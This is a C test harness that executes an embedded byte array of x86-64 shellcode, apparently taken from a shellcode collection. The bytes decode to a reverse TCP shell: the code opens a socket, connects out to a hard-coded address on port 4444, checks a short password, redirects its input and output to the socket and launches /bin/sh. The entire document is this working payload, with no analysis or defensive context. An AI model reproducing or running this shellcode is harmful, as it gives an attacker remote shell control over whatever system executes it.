#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x50\x50\x50\x50\x5a\xb0\x02\x50\x50\x5e\x5f\x48\xd1\xee\x04\x27\x0f\x05\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\x7d\xfe\xfd\xfe\x81\x44\x24\x04\x02\x02\x02\x02\x54\x5e\x50\x5f\x80\xc2\x10\xb0\x2a\x0f\x05\x50\x54\x5e\x48\x83\xea\x0c\x0f\x05\x50\x59\x57\x58\x48\x83\xe9\x03\x54\x5f\x68\x68\x65\x6c\x6c\x54\x5e\x48\xa7\x75\x2f\x80\xc1\x02\x50\x5f\x51\x48\x31\xc0\x48\x83\xe9\x01\x51\x5e\x04\x21\x0f\x05\x59\xe2\xef\xeb\x0a\x5f\x88\x47\x07\x50\x5a\x04\x3b\x0f\x05\xe8\xf1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

